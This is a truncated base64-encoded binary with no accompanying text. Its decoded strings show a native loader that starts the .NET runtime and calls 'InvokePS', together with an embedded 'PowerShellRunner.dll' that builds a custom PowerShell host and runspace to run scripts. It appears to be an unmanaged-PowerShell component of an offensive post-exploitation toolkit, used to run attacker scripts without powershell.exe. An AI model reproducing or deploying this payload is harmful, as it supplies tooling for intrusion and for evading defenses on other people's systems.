AAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAABJAG4AdgBvAGsAZQBQAFMAAAAAAI0YgJKODmdIswx/qDiE6N5tAHMAYwBvAHIAZQBlAC4AZABsAGwAAAB2ADIALgAwAC4ANQAwADcAMgA3AAAAAAB2ADQALgAwAC4AMwAwADMAMQA5AAAAAABDTFJDcmVhdGVJbnN0YW5jZQAAAEMAbwB1AGwAZAAgAG4AbwB0ACAAZgBpAG4AZAAgAC4ATgBFAFQAIAA0AC4AMAAgAEEAUABJACAAQwBMAFIAQwByAGUAYQB0AGUASQBuAHMAdABhAG4AYwBlAAAAAAAAAEMATABSAEMAcgBlAGEAdABlAEkAbgBzAHQAYQBuAGMAZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAASQBDAEwAUgBNAGUAdABhAEgAbwBzAHQAOgA6AEcAZQB0AFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAASQBDAEwAUgBSAHUAbgB0AGkAbQBlAEkAbgBmAG8AOgA6AEkAcwBMAG8AYQBkAGEAYgBsAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAAAAAuAE4ARQBUACAAcgB1AG4AdABpAG0AZQAgAHYAMgAuADAALgA1ADAANwAyADcAIABjAGEAbgBuAG8AdAAgAGIAZQAgAGwAbwBhAGQAZQBkAAoAAAAAAAAASQBDAEwAUgBSAHUAbgB0AGkAbQBlAEkAbgBmAG8AOgA6AEcAZQB0AEkAbgB0AGUAcgBmAGEAYwBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABDAG8AdQBsAGQAIABuAG8AdAAgAGYAaQBuAGQAIABBAFAASQAgAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAAAB3AGsAcwAAAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAAUwBhAGYAZQBBAHIAcgBhAHkAUAB1AHQARQBsAGUAbQBlAG4AdAAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAaQBuAHYAbwBrAGUAIABJAG4AdgBvAGsAZQBQAFMAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAUG93ZXJTaGVsbFJ1bm5lcgAAAABQb3dlclNoZWxsUnVubmVyLlBvd2VyU2hlbGxSdW5uZXIAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAdABoAGUAIAByAHUAbgB0AGkAbQBlACAAaABvAHMAdAAKAAAAAABDAEwAUgAgAGYAYQBpAGwAZQBkACAAdABvACAAcwB0AGEAcgB0ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABSAHUAbgB0AGkAbQBlAEMAbAByAEgAbwBzAHQAOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAQQBwAHAARABvAG0AYQBpAG4ASQBkACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAEMAbwByAFIAdQBuAHQAaQBtAGUASABvAHMAdAA6ADoARwBlAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGQAZQBmAGEAdQBsAHQAIABBAHAAcABEAG8AbQBhAGkAbgAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABsAG8AYQBkACAAdABoAGUAIABhAHMAcwBlAG0AYgBsAHkAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AG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VudFRocmVhZABBZGQATmV3R3VpZABDb21tYW5kAGNvbW1hbmQAQXBwZW5kAFByb2dyZXNzUmVjb3JkAHJlY29yZABDdXN0b21QU0hvc3RVc2VySW50ZXJmYWNlAEN1c3RvbVBTUkhvc3RSYXdVc2VySW50ZXJmYWNlAFBTSG9zdFJhd1VzZXJJbnRlcmZhY2UAQ3JlYXRlUnVuc3BhY2UAUHJvbXB0Rm9yQ2hvaWNlAGRlZmF1bHRDaG9pY2UAc291cmNlAGV4aXRDb2RlAG1lc3NhZ2UASW52b2tlAGdldF9LZXlBdmFpbGFibGUASURpc3Bvc2FibGUAUmVjdGFuZ2xlAHJlY3RhbmdsZQBnZXRfV2luZG93VGl0bGUAc2V0X1dpbmRvd1RpdGxlAF93aW5kb3dUaXRsZQBnZXRfTmFtZQB1c2VyTmFtZQB0YXJnZXROYW1lAFJlYWRMaW5lAEFwcGVuZExpbmUAV3JpdGVWZXJib3NlTGluZQBXcml0ZUxpbmUAV3JpdGVXYXJuaW5nTGluZQBXcml0ZURlYnVnTGluZQBXcml0ZUVycm9yTGluZQBDcmVhdGVQaXBlbGluZQBnZXRfQ3VycmVudFVJQ3VsdHVyZQBnZXRfQ3VycmVudEN1bHR1cmUARGlzcG9zZQBJbml0aWFsU2Vzc2lvblN0YXRlAHNldF9BcGFydG1lbnRTdGF0ZQBXcml0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHZhbHVlAGdldF9CdWZmZXJTaXplAHNldF9CdWZmZXJTaXplAF9idWZmZXJTaXplAGdldF9DdXJzb3JTaXplAHNldF9DdXJzb3JTaXplAF9jdXJzb3JTaXplAGdldF9XaW5kb3dTaXplAHNldF9XaW5kb3dTaXplAGdldF9NYXhQaHlzaWNhbFdpbmRvd1NpemUAX21heFBoeXNpY2FsV2luZG93U2l6ZQBnZXRfTWF4V2luZG93U2l6ZQBfbWF4V2luZG93U2l6ZQBfd2luZG93U2l6ZQBTeXN0ZW0uVGhyZWFkaW5nAFJlYWRMaW5lQXNTZWN1cmVTdHJpbmcAVG9TdHJpbmcAc2V0X1dpZHRoAF9yYXdVaQBfdWkAUFNDcmVkZW50aWFsAFByb21wdEZvckNyZWRlbnRpYWwAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAFBvd2VyU2hlbGxSdW5uZXIuZGxsAEJ1ZmZlckNlbGwAZmlsbABnZXRfSXRlbQBTeXN0ZW0AT3BlbgBvcmlnaW4AZ2V0X1ZlcnNpb24ATm90aWZ5RW5kQXBwbGljYXRpb24ATm90aWZ5QmVnaW5BcHBsaWNhdGlvbgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAGRlc3RpbmF0aW9uAFN5c3RlbS5HbG9iYWxpemF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAENvbW1hbmRDb2xsZWN0aW9uAGdldF9DdXJzb3JQb3NpdGlvbgBzZXRfQ3Vyc29yUG9zaXRpb24AX2N1cnNvclBvc2l0aW9uAGdldF9XaW5kb3dQb3NpdGlvbgBzZXRfV2luZG93UG9zaXRpb24AX3dpbmRvd1Bvc2l0aW9uAGNhcHRpb24ATm90SW1wbGVtZW50ZWRFeGNlcHRpb24ARmllbGREZXNjcmlwdGlvbgBDaG9pY2VEZXNjcmlwdGlvbgBDdWx0dXJlSW5mbwBLZXlJbmZvAGNsaXAAU3RyaW5nQnVpbGRlcgBGbHVzaElucHV0QnVmZmVyAHNldF9BdXRob3JpemF0aW9uTWFuYWdlcgBQb3dlclNoZWxsUnVubmVyAGdldF9Gb3JlZ3JvdW5kQ29sb3IAc2V0X0ZvcmVncm91bmRDb2xvcgBfZm9yZWdyb3VuZENvbG9yAGdldF9CYWNrZ3JvdW5kQ29sb3IAc2V0X0JhY2tncm91bmRDb2xvcgBfYmFja2dyb3VuZENvbG9yAENvbnNvbGVDb2xvcgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X0NvbW1hbmRzAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAGNob2ljZXMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAUFNDcmVkZW50aWFsVHlwZXMAYWxsb3dlZENyZWRlbnRpYWxUeXBlcwBQaXBlbGluZVJlc3VsdFR5cGVzAENvb3JkaW5hdGVzAFBTQ3JlZGVudGlhbFVJT3B0aW9ucwBSZWFkS2V5T3B0aW9ucwBkZXNjcmlwdGlvbnMAb3B0aW9ucwBXcml0ZVByb2dyZXNzAE1lcmdlTXlSZXN1bHRzAFNjcm9sbEJ1ZmZlckNvbnRlbnRzAEdldEJ1ZmZlckNvbnRlbnRzAFNldEJ1ZmZlckNvbnRlbnRzAGNvbnRlbnRzAENvbmNhdABQU09iamVjdABzZXRfSGVpZ2h0AFNldFNob3VsZEV4aXQAQ3JlYXRlRGVmYXVsdABBZGRTY3JpcHQARW50ZXJOZXN0ZWRQcm9tcHQARXhpdE5lc3RlZFByb21wdABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QAQ3VzdG9tUFNIb3N0AGdldF9PdXRwdXQAU3lzdGVtLlRleHQAUmVhZEtleQBSdW5zcGFjZUZhY3RvcnkAU3lzdGVtLlNlY3VyaXR5AAAAF28AdQB0AC0AZABlAGYAYQB1AGwAdAABF0MAbwBuAHMAbwBsAGUASABvAHMAdAAAgXdFAG4AdABlAHIATgBlAHMAdABlAGQAUAByAG8AbQBwAHQAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBdUUAeABpAHQATgBlAHMAdABlAGQAUAByAG8AbQBwAHQAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAEDCgAAD0QARQBCAFUARwA6ACAAAA9FAFIAUgBPAFIAOgAgAAATVgBFAFIAQgBPAFMARQA6ACAAABNXAEEAUgBOAEkATgBHADoAIAAAgWFQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYFzUAByAG8AbQBwAHQARgBvAHIAQwBoAG8AaQBjAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcw